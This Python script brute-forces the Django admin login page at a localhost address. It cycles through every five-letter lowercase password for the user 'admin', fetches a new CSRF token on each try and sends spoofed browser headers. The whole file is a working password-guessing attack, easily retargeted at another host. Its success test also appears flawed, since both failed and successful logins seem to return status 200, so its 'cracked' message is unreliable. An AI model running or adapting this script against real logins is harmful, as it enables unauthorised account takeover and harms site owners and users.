import itertools
import string
import time

import requests
url = 'http://127.0.0.1:8000/admin/'

login_route = 'login/?next=/admin/'

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0',
    'origin': url, 'referer': url + login_route
}

USERNAME = 'admin'


def brute_force():
    all_start = time.time()
    for combination in itertools.product(string.ascii_lowercase, repeat=5):
        start = time.time()
        password = ''.join(combination)
        session = requests.session()
        csrf_token = session.get(url).cookies['csrftoken']
        print(f'CHECKING FOR {USERNAME} and {password} ...')

        LOGIN_DATA = {
            'username': USERNAME,
            'password': password,
            'csrfmiddlewaretoken': csrf_token,
        }

        login_redirect = session.post(url + login_route, headers=HEADERS, data=LOGIN_DATA)

        print(f"Time for one try: {time.time() - start}")
        if login_redirect.status_code != 200:
            continue
        else:
            print("Password Cracked Successfully ..! ", USERNAME, " and ", password)
            break

    print(f"Time for cracked: {time.time() - all_start}")
